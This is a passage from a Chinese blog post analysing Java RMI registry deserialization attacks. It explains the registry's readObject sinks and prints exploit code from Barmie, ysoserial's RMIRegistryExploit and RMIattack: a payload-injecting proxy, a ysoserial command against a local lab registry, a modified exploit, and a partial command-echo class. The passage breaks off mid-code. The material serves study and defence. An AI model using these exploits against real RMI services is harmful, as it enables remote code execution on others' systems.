class="keyword">throw</span> <span class="keyword">new</span> SkeletonMismatchException(<span class="string">"interface hash mismatch"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//设定变量开始处理请求</span></span><br><span class="line">            <span class="comment">//var6为RegistryImpl对象，调用的就是这个对象的bind、list等方法</span></span><br><span class="line">            RegistryImpl var6 = (RegistryImpl)var1;</span><br><span class="line">            <span class="comment">//接受客户端输入流的参数变量</span></span><br><span class="line">            String var7;</span><br><span class="line">            Remote var8;</span><br><span class="line">            ObjectInput var10;</span><br><span class="line">            ObjectInput var11;</span><br><span class="line">            <span class="comment">//var3表示对应的方法值0-4，这个数字是跟RMI客户端约定好的</span></span><br><span class="line">            <span class="comment">//比如RMI客户端发送bind请求：就是sun.rmi.registry.RegistryImpl_Stub#bind中的这一句</span></span><br><span class="line">            <span class="comment">//super.ref.newCall(this, operations, 0, 4905912898345647071L);</span></span><br><span class="line">            <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">            <span class="comment">//统一删除了try等语句</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="comment">//bind(String,Remote)分支</span></span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//1.反序列化触发处</span></span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    <span class="comment">//list()分支</span></span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                    String[] var97 = var6.list();</span><br><span class="line">                    ObjectOutput var98 = var2.getResultStream(<span class="keyword">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="comment">//lookup(String)分支</span></span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//2.反序列化触发处</span></span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  <span class="comment">//rebind(String,Remote)分支</span></span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//3.反序列化触发处</span></span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    <span class="comment">//unbind(String)分支</span></span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//4.反序列化触发处</span></span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                var6.unbind(var7);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"invalid method number"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以得到4个反序列化触发处：<strong>lookup</strong>、<strong>unbind</strong>、<strong>rebind</strong>、<strong>bind</strong>。</p><h4 id="RMI客户端角度的lookup攻击RMI注册端"><a href="#RMI客户端角度的lookup攻击RMI注册端" class="headerlink" title="RMI客户端角度的lookup攻击RMI注册端"></a>RMI客户端角度的lookup攻击RMI注册端</h4><blockquote><p>其中lookup是以客户端的角度攻击，但是其原理与以服务端角度攻击的bind，rebind，unbind完全一致。我们会在最后的罗列中把lookup区分开，不再领出来细说。</p><p>此处建立一个小标题，作为提醒</p></blockquote><p>这里可能会有一个疑问：<br><strong>4个接口有两类参数，String和Remote类型的Object，那么是不是我们只能攻击必须要是Remote类型的Object接口呢？即实际上只有bind、rebind接口才是可以攻击的？</strong></p><p>之所以会产生这个疑问是由于 有些文章会说替换Remote类型的参数为payload 或者 我们看Ysoserial的payload的构造过程也是构造出一个Remote类型的payload Object，再把正常的Remote参数替换为Remote类型的payload，这些都给我们一种只有Remote参数才能反序列化的假象</p><p>虽然我们看到RMI注册端的解析过程是直接反序列化传参，看样子String和Remote的参数位置都是可以的，但还是会摇摆不定。</p><p>但事实是 <strong>RMI注册端没有任何校验，你的payload放在Remote参数位置可以攻击成功，放在String参数位置也可以攻击成功</strong>。<br>而之所以Ysoserial生成payload要变成Remote格式，是因为RMI服务端发这个数据包的流程中会需要这个对象是Remote类型的，我们之后将证明，并且详细说明。</p><h3 id="Barmie-Bind"><a href="#Barmie-Bind" class="headerlink" title="Barmie - Bind"></a>Barmie - Bind</h3><p>各个工具都对于服务端打注册端的bind攻击写了exploit，相对于上面攻击形式，bind攻击更具备通用性。</p><p>Barmie对于Bind接口有探测和攻击两个模块</p><p>简单总结一下探测模块：<code>nb.barmie.modes.attack.attacks.Java.IllegalRegistryBind#canAttackEndpoint</code></p><ol><li>新建一个RMI代理服务器，在这个代理服务器中会对输出的数据包进行重新构造</li><li>获取这个RMI对象，调用其bind方法</li><li>重构客户端输出的数据包，改变其内容为预设好的一个Object</li><li>服务端肯定会报错（由于我们预设的Object不会被正确解析执行），根据服务端返回报错栈，去匹配是否有<code>filter status: REJECTED</code>字符串来判断，对方的JDK版本我们是否可以攻击。（这个字符串是JEP290拦截导致的，之后我们会提到）</li><li>如果没有匹配到就说明可以攻击。</li></ol><p>再来详细看看流程比较相似的攻击模块<code>nb.barmie.modes.attack.attacks.Java.IllegalRegistryBind#executeAttack</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeAttack</span><span class="params">(RMIEndpoint ep, DeserPayload payload, String cmd)</span> <span class="keyword">throws</span> BaRMIeException </span>&#123;</span><br><span class="line">    RMIBindExploitProxy proxy = <span class="keyword">null</span>;<span class="comment">//代理器</span></span><br><span class="line">    Registry reg;</span><br><span class="line"><span class="comment">//已删去try部分</span></span><br><span class="line">    <span class="comment">//1.初始化一个bind RMI注册端代理器</span></span><br><span class="line">    <span class="comment">//我们的payload从这里给入</span></span><br><span class="line">    proxy = <span class="keyword">new</span> RMIBindExploitProxy(InetAddress.getByName(ep.getEndpoint().getHost()), ep.getEndpoint().getPort(), <span class="keyword">this</span>._options, payload.getBytes(cmd, <span class="number">0</span>));</span><br><span class="line">    proxy.startProxy();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.从RMI注册端代理器获取一个注册端对象</span></span><br><span class="line">    reg = LocateRegistry.getRegistry(proxy.getServerListenAddress().getHostAddress(), proxy.getServerListenPort());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.通过RMI注册端代理器调用bind，修改参数为给定的payload</span></span><br><span class="line">    <span class="comment">//reg.bind(随机字符串,一个接口需要的Remote接口)</span></span><br><span class="line">    <span class="comment">//但是经过注册端代理器之后，这里的参数会被改为：bind(PAYLOAD, null)，没错payload是String的位置</span></span><br><span class="line">    reg.bind(<span class="keyword">this</span>.generateRandomString(), <span class="keyword">new</span> BaRMIeBindExploit());</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">BaRMIeBindExploit</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后形成的调用是<code>bind(PAYLOAD, null)</code><br>看看具体实现<code>nb.barmie.net.proxy.thread.BindPayloadInjectingProxyThread#handleData</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteArrayOutputStream <span class="title">handleData</span><span class="params">(ByteArrayOutputStream data)</span> </span>&#123;</span><br><span class="line">ByteArrayOutputStream out;</span><br><span class="line"><span class="keyword">int</span> blockLen;</span><br><span class="line"><span class="keyword">byte</span>[] dataBytes;</span><br><span class="line"><span class="comment">//获取输入的长度</span></span><br><span class="line">dataBytes = data.toByteArray();</span><br><span class="line"><span class="comment">//判断这个输入包是不是一个RMI调用包，如果是的话进行修改</span></span><br><span class="line"><span class="keyword">if</span>(dataBytes.length &gt; <span class="number">7</span> &amp;&amp; dataBytes[<span class="number">0</span>] == (<span class="keyword">byte</span>)<span class="number">0x50</span>) &#123;</span><br><span class="line"><span class="comment">//调用包以 TC_BLOCKDATA 标签开头,获取它的标签长度</span></span><br><span class="line">blockLen = (<span class="keyword">int</span>)(dataBytes[<span class="number">6</span>] &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//自己构建一个新的字节流，以原来包的长度和TC_BLOCKDATA标签开头</span></span><br><span class="line">out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">out.write(dataBytes, <span class="number">0</span>, blockLen + <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在后面写入我们给定的payload</span></span><br><span class="line">out.write(<span class="keyword">this</span>._payload, <span class="number">0</span>, <span class="keyword">this</span>._payload.length);</span><br><span class="line"></span><br><span class="line"><span class="comment">//最后给一个NULL标签（作为bind方法的第二个参数）</span></span><br><span class="line">out.write((<span class="keyword">byte</span>)<span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//把新的数据包发送给服务端</span></span><br><span class="line"><span class="keyword">return</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//不是RMI调用的数据包就直接发送</span></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这边完全是自己重构了客户端发往服务端的数据包，并且给入了两个参数，<strong>payload</strong>替换<strong>String</strong>，<strong>null</strong>替换<strong>Remote</strong>。</p><p>我们再攻击一下我们的RMI服务端靶机，用wireshark抓包确认下，顺便把后面Ysoserial-RMIRegistryExploit的包先提上来对比一下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uk8849j31kx0r2wod.jpg" alt="barmie-bind.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uop4x4j31ei0ovjzl.jpg" alt="YSO-RMI-bind.png"></p><p>可以发现Barmie的bind攻击是通过第一个String参数替换payload（Hashset就是CC的攻击链）攻击成功的，而Ysoserial的RMIRegisterExpolit模块的bind攻击是通过构造了一个符合Remote条件的第二个Remote参数（把CC的攻击链包装成了Remote）攻击成功的。</p><p>那么之前的疑问 <strong>是不是我们只能攻击必须要是Remote类型的Object接口呢？</strong>也就破案了：不是，是String和Remote类型均可。</p><p>那么也就是说<strong>lookup</strong>、<strong>unbind</strong>、<strong>rebind</strong>、<strong>bind</strong>四个接口都可以利用同样的原理攻击。</p><h3 id="Ysoserial-RMIRegistryExploit-Bind"><a href="#Ysoserial-RMIRegistryExploit-Bind" class="headerlink" title="Ysoserial-RMIRegistryExploit - Bind"></a>Ysoserial-RMIRegistryExploit - Bind</h3><p>那么Ysoserial不写代理器还去自己把CC攻击链包装成了Remote类型，也挺有意思的，我们看看它是怎么做的。</p><p>命令行用这个命令调用exploit模块：<code>java -cp F:\xxx\java\ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections1 &quot;calc&quot;</code></p><p>看下核心代码<code>ysoserial.exploit.RMIRegistryExploit#exploit</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exploit</span><span class="params">(<span class="keyword">final</span> Registry registry,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;Void&gt;()&#123;<span class="function"><span class="keyword">public</span> Void <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">//获取payload</span></span><br><span class="line">ObjectPayload payloadObj = payloadClass.newInstance();</span><br><span class="line">            Object payload = payloadObj.getObject(command);</span><br><span class="line">String name = <span class="string">"pwned"</span> + System.nanoTime();</span><br><span class="line">            <span class="comment">//将payload封装成Map</span></span><br><span class="line">            <span class="comment">//然后通过sun.reflect.annotation.AnnotationInvocationHandler建立起动态代理</span></span><br><span class="line">            <span class="comment">//变为Remote类型</span></span><br><span class="line">Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//封装的remote类型，通过RMI客户端的正常接口发出去</span></span><br><span class="line">registry.bind(name, remote);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">Utils.releasePayload(payloadObj, payload);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用到了<strong>动态代理</strong>，简单总结一下：</p><ul><li>被代理的接口：Remote.class</li><li>代理的实现类（也可以理解为拦截器）：sun.reflect.annotation.AnnotationInvocationHandler</li><li>动态代理之后的对象：调用实现Remote接口的绑定代理的对象的任意方法都会自动被拦截，前往<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的invoke方法执行。</li></ul><p>简单看下是怎么ysoserial是怎么样完成动态代理的，即<code>ysoserial.payloads.util.Gadgets#createMemoitizedProxy</code>的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createMemoitizedProxy</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//Map是我们传入的，需要填充进入AnnotationInvocationHandler构造方法中的对象。</span></span><br><span class="line">    <span class="comment">//iface是被动态代理的接口</span></span><br><span class="line">    <span class="keyword">return</span> createProxy(createMemoizedInvocationHandler(map), iface, ifaces);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里创建了一个`sun.reflect.annotation.AnnotationInvocationHandler`拦截器的对象</span></span><br><span class="line"><span class="comment">//传入了我们含有payload的map，进入构造方法，会在构造方法内进行赋值给对象的变量</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//正式开始绑定代理动态代理</span></span><br><span class="line"><span class="comment">//ih 拦截器</span></span><br><span class="line"><span class="comment">//iface 需要被代理的类</span></span><br><span class="line"><span class="comment">//ifaces 这里没有</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createProxy</span> <span class="params">( <span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + <span class="number">1</span>);</span><br><span class="line">    allIfaces[ <span class="number">0</span> ] = iface;</span><br><span class="line">    <span class="keyword">if</span> ( ifaces.length &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        System.arraycopy(ifaces, <span class="number">0</span>, allIfaces, <span class="number">1</span>, ifaces.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//上面整合了一下需要代理的接口到allIfaces里面</span></span><br><span class="line">    <span class="comment">//然后Proxy.newProxyInstance，完成allIfaces到ih的绑定</span></span><br><span class="line">    <span class="comment">//（Gadgets.class.getClassLoader()就是获取了一个加载器，不用太管）</span></span><br><span class="line">    <span class="comment">//iface.cast是将获取的绑定结果对象转变为iface（即Remote）的对象类型</span></span><br><span class="line">    <span class="keyword">return</span> iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边就完成了一个通过<strong>动态代理</strong>封装成了一个Remote.class的接口对象，这样就可以在客户端正常调用<code>registry.bind(name, remote);</code>了，因为bind的接口这么定义了需要Remote对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(String name, Remote obj)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span>;</span><br></pre></td></tr></table></figure><p>那么我们传输过去了我们的remote动态代理对象，在服务端解析过程中与动态代理有关系么？</p><p><strong>答案是：P关系都没有！</strong></p><p>上面可以看到我们的使用的是yso-cc1的payload去在jdk1.7u80中触发payload：而cc1的触发同样使用到了动态代理机制，该payload在服务端的触发与动态代理也息息相关：</p><ul><li>cc1的payload是一个AnnotationInvocationHandler对象，跟上面类似，在其构造的时候，我们把一个 <strong>动态代理到AnnotationInvocationHandler.invoke方法的map</strong> 塞入了其memberValues属性中</li><li>在服务端触发var.readobject()时，会进入AnnotationInvocationHandler类的readobject()</li><li>在readobject()中会执行<code>this.memberValues.entrySet()</code>。entrySet，这是一个map的方法。根据动态代理性质，我们绑定了map的方法到AnnotationInvocationHandler.invoke方法，所以这边就会进入invoke方法。</li><li>同时我们还在这个处心积虑想进来的invoke方法的AnnotationInvocationHandler对象中又弄了一个lazyMap在memberValues属性中！只要触发了这个lazyMap的get方法就等于成功。（之后复杂的就略了）</li><li>而AnnotationInvocationHandler.invoke方法中刚好有<code>this.memberValues.get(var4);</code>，而这个this.memberValues就是lazyMap。</li></ul><p>这边简单讲了下动态代理在一般序列化链中的作用，就是<strong>连接一个类的任意方法到一个拦截器的invoke方法（到invoke方法！）</strong></p><p>而在这边Ysoserial通过动态代理产生的<strong>remote对象丝毫没有用到动态代理核心的特点（到invoke方法中）</strong>。</p><p>它实际做的只是把payload放在一个remote接口的类的属性里面。然后在服务端反序列化的时候，利用反序列化一个对象的过程中会递归类的属性进行反序列化的特点，来反序列化我们的payload，从而触发漏洞。</p><p>使用动态代理只是因为：动态代理也同样可以做到把payload放在AnnotationInvocationHandler拦截器的属性里面，然后动态代理可以把拦截器包装成任意类接口，如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uw9lznj31do0bttav.jpg" alt="yso-payload.png"></p><p>同样我们也可以不用动态代理，自己实现一个remote接口的类，然后放入payload，效果是一样的。</p><p>修改一点点：<code>ysoserial.exploit.RMIRegistryExploit#exploit</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加个Remote接口的类，要支持序列化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">BindExploit</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//弄个地方放payload</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object memberValues;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">BindExploit</span><span class="params">(Object payload)</span> </span>&#123;</span><br><span class="line">    memberValues = payload;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exploit</span><span class="params">(<span class="keyword">final</span> Registry registry,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;Void&gt;()&#123;<span class="function"><span class="keyword">public</span> Void <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectPayload payloadObj = payloadClass.newInstance();</span><br><span class="line">            Object payload = payloadObj.getObject(command);</span><br><span class="line">String name = <span class="string">"pwned"</span> + System.nanoTime();</span><br><span class="line"><span class="comment">//yso动态代理包装</span></span><br><span class="line"><span class="comment">//Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);</span></span><br><span class="line">            <span class="comment">//自己包装</span></span><br><span class="line">            Remote remote_lala = <span class="keyword">new</span> BindExploit(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//registry.bind(name, remote);</span></span><br><span class="line">                <span class="comment">//自己包装</span></span><br><span class="line">                 registry.bind(name, remote_lala);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">Utils.releasePayload(payloadObj, payload);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16v3vulhj30vz044q34.jpg" alt="yso-自己包装.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16v85jyoj31720g2djn.jpg" alt="yso-自己包装-calc.png"></p><p>这里有一个不是很清楚的问题，自实现remote接口往里放入payload，在RMI客户端有这个类，那序列化传输到RMI服务端，<strong>服务端环境里是没有这个类的，是否会报错，无法利用</strong>？？</p><p>本地测试实际上是两个java项目，攻击方yso项目，服务方RMIserialize项目，因此环境是不通的。</p><p>测试报错可以证明，是找不到这个类的，但是却不影响利用。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16wjm7xfj32210wp15p.jpg" alt="bind-自实现类.png"></p><p>可以从报错信息中看到是ClassNotFound的，但是仍然弹框成功。大概的理由猜测应该是反序列化恢复一个类的时候会先去处理好他的序列化变量，再去进行组装恢复成类。我们触发payload的过程是恢复他的序列化变量的时候，而之后找得到找不到这个类就不重要了。</p><blockquote><p>这个ysoserial用动态代理去实现remote接口封装payload的操作真的让我迷惑了好久，我一直以为服务端payload触发和动态代理的特性有关(由于CC链是这样的，想当然这样了)。网上的文章大多一笔带过，这边再次感谢0kami大佬QAQ，沟通是真的解惑。</p></blockquote><h3 id="RMIattack-Bind-回显"><a href="#RMIattack-Bind-回显" class="headerlink" title="RMIattack - Bind + 回显"></a>RMIattack - Bind + 回显</h3><p> 在反序列化利用的时候，常常遇到你一个payload打过去，但是对方没反应，你也不知道对方执行了命令没有。命令执行结果回显一直是一个很头疼的问题。RMIattack工具解决了命令回显的问题。</p><p>这个工具在Ysoserial-RMIRegistryExploit模块的基础上（同样是用动态调用封装payload至remote接口类，并且使用的是CC1的payload）通过写入了一个class文件，再调用class文件来执行系统命令的形式，实现命令回显。我们简单看下实现过程。</p><p>其攻击步骤主要分为两部分：</p><ol><li><p>先判断系统类型：windows，linux，然后写入一个文件再临时目录。（这里修改了CC链的底层调用函数，yso默认是调用Runtime.getRuntime().exec()，这边改成了write()方法）</p><ul><li>windows的话生成文件<code>c:/windows/temp/ErrorBaseExec.class</code></li><li>linux的话生成<code>/tmp/ErrorBaseExec.class</code></li></ul></li><li><p>根据操作系统类型，从固定路径loadclass加载class，然后调用其do_exec方法，传入要执行的命令。执行的命令结果会写在抛出异常中，服务器通过异常抛出传输执行结果到客户端，然后客户端解析报错信息获取命令执行结果。</p></li></ol><p>由于在工具代码中，写入的文件直接被写成字节串了，这边可以自己打一下自己，来拿到被写入的文件<code>ErrorBaseExec.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ErrorBaseExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ErrorBaseExec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//解析</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readBytes</span><span class="params">(InputStream var0)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedReader var1 = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(var0));</span><br><span class="line">        StringBuffer var2 = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        String var3;</span><br><span class="line">        <span class="keyword">while</span>((var3 = var1.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var2.append(var3).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String var4 = var2.toString();</span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br><span 